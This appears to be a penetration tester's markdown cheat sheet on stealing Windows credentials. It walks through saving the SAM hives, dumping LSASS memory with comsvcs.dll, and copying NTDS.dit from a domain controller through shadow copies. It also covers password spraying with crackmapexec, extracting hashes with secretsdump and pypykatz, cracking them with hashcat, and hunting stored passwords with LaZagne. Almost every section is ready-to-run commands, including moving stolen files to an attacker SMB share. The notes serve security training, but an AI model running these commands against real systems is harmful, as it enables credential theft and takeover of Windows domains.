### Content
- [Transfer Files Technique](#transfer-files-technique)
- [Hash Crack Technique](#hash-crack-technique)
- [Checking Privileges](#checking-privileges)
- [SAM Attacks](#sam-attacks)
- [LSASS Attacks](#lsass-attacks)
- [NTDS.dit Attacks](#ntds.dit-attacks)
- [Credential Hunting](#credential-hunting)
---
##### Transfer Files Technique
Transfer files from the target to the attacker machine using [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py).
1. Create a Share with smbserver.py on the attacker host
	``` bash
	sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <shareName> /home/bob/Documents/
	```
2. Move files on the target host to the created share
	``` PowerShell
	C:\> move <FileName> \\<IP>\<shareName>
	```
---
##### Hash Crack Technique
Crack hashes with hashcat. [supported hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)

``` bash
# Crack list of hashes
sudo hashcat -m 1000 hashestocrack.txt <wordlist>
# Crack one hash directly
sudo hashcat -m 1000 <hash> <wordlist>
```
---
##### Checking Privileges
- Check local priv using `net localgroup`.
- Check domain priv using `net user <UserName>`.
---
## SAM Attacks

Dumping the local SAM database from a compromised host. (**Local admin privileges required**)
Three registry hives required to dump the SAM secrets:
- `hklm\sam` Contains the hashes associated with local account passwords.
- `hklm\system` Contains the system bootkey, which is used to encrypt the SAM database.
- `hklm\security` Contains cached credentials for domain accounts.

- Save the required hives:
	``` PowerShell
	C:\WINDOWS\system32> reg.exe save hklm\sam C:\Windows\Temp\sam.save  
	C:\WINDOWS\system32> reg.exe save hklm\system C:\Windows\Temp\system.save  
	C:\WINDOWS\system32> reg.exe save hklm\security C:\Windows\Temp\security.save
	```
- Use [Transfer Files Technique](#transfer-files-technique) mentioned above to transfer the three hives
- Dump Hashes with Impacket's secretsdump.py
	``` bash
	python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
	```
- Use [Hash Crack Technique](#hash-crack-technique) mentioned above to crack the dumped hashes.

> [!Note]
> CrackMapExec can accomplish the same steps shown above, all with one command.
> `crackmapexec smb <IP> --local-auth -u <UserName> -p <Password> --sam`

---
## LSASS Attacks
Pulling hashes from memory by dumping the `lsass.exe` process memory.
- In case we have UI access, dump the process memory using the task manager. `lsass.DMP` file created in `C:\Users\loggedonusersdirectory\AppData\Local\Temp`
<img src="https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png" style="width:50%;height:50%">

- In case of using command-line:
	- get the PID
		- CMD `tasklist | findstr lsass.exe`
		- PowerShell `Get-Process lsass`
	- then use [Rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) & Comsvcs.dll to dump the process.
		``` PowerShell
		rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
		```
- Use [Transfer Files Technique](#transfer-files-technique) mentioned above to transfer the process dump.
- Use [Pypykatz](https://github.com/skelsec/pypykatz/blob/main/pypykatz/pypykatz.py) to extract hashes.
	``` bash
	pypykatz lsa minidump /home/peter/Documents/lsass.dmp
	```
- Use [Hash Crack Technique](#hash-crack-technique) mentioned above to crack the dumped hashes.

> [!Note]
> CrackMapExec can accomplish the same steps shown above, all with one command.
> `crackmapexec smb <IP> --local-auth -u <Username> -p <Password> --lsa`

---
## NTDS.dit Attacks
Extracting hashes from the NTDS database (ntds.dit) on a **Domain Controller**.

- Lunch Dictionary Attack if an account lockout policy is not enforced.
	``` bash
	crackmapexec smb <IP> -u <UserName_wordlist> -p /usr/share/wordlists/fasttrack.txt
	```
- If the dictionary attack worked and we got a DC creds, login to the DC system using `evil-winrm`.
	``` bash
	evil-winrm -i <IP> -u <UserName> -p '<Password>'
	```

- With access to a DC, to dump secrets from NTDS.dit, attacker should exfiltrate:
	- `C:\Windows\NTDS\NTDS.dit`
	- `HKEY_LOCAL_MACHINE\SYSTEM` registry hive, which is required to obtain the `Boot Key` for decrypting `ntds.dit`.
- Local admin or domain Admin privilege **required**
- We can't copy the ntds.dit directly as it's always being used by the domain controller, So we will create a shadow copy for the entire drive.

- Use vssadmin to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (VSS).
	``` Powershell
	*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
	```
- Copy `NTDS.dit` and `HKLM\SYSTEM` from the shadow volume.
	``` Powershell
	*Evil-WinRM* PS C:> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
	*Evil-WinRM* PS C:> cmd.exe /c reg SAVE HKLM\SYSTEM C:\temp\SYS
	```
- Transfer `NTDS.dit` and `HKLM\SYSTEM` to the attacker host, try [Transfer Files Technique](#transfer-files-technique).
	``` powershell
	*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\temp\ntds.dit \\<IP>\CompData 
	*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\temp\SYS \\<IP>\CompData
	```
- Extract hashes from `NTDS.dit` can be done with many ways:
	- Using [DSInternals](https://www.dsinternals.com/en/downloads/) PowerShell module which provides the `Get-BootKey` and `Get-ADDBAccount`.
		``` Powershell
		PS> $Key = Get-BootKey -SystemHiveFilePath 'Path to the /registry/SYSTEM hive'
		PS> Get-ADDBAccount -BootKey $Key -DatabasePath 'NTDS.dit' -All | Out-File Hashdump.txt
		# To create a ready list for cracking
		PS> Get-ADDBAccount -BootKey $Key -DatabasePath 'NTDS.dit' -All | Format-Custom -View HashcatNT
		# If clean state database error occurred, run the following command
		PS> ESENTUTL /p 'NTDS.dit' /!10240 /8 /o
		```
	- [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) or [gosecretsdump](https://github.com/c-sto/gosecretsdump).
		``` bash
		secretsdump -ntds ntds.dit.save -system SYS LOCAL
		gosecretsdump -ntds ntds.dit.save -system SYS
		```
- Use [Hash Crack Technique](#hash-crack-technique) mentioned above to crack the dumped hashes.

> [!Note]
> CrackMapExec can accomplish the same steps shown above, all with one command.
> `crackmapexec smb <IP> -u <UserName> -p <Password> --ntds`

---
## Credential Hunting

Once we have access to a target, we can hunt stored credentials stored on it.
- Key Terms to Search: Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials. using findstr:
	``` Powershell
	findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
	```
- We can transfer [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/) to the target host, using the [Transfer Files Technique](#transfer-files-technique) discussed above then run it with the next command
	``` CMD
	C:\> start lazagne.exe all
	```
- Other places we should keep in mind when credential hunting:
	- Group Policy and scripts in the SYSVOL share.
	- Look at IT shares.
	- Passwords in the AD user or computer description fields.
---
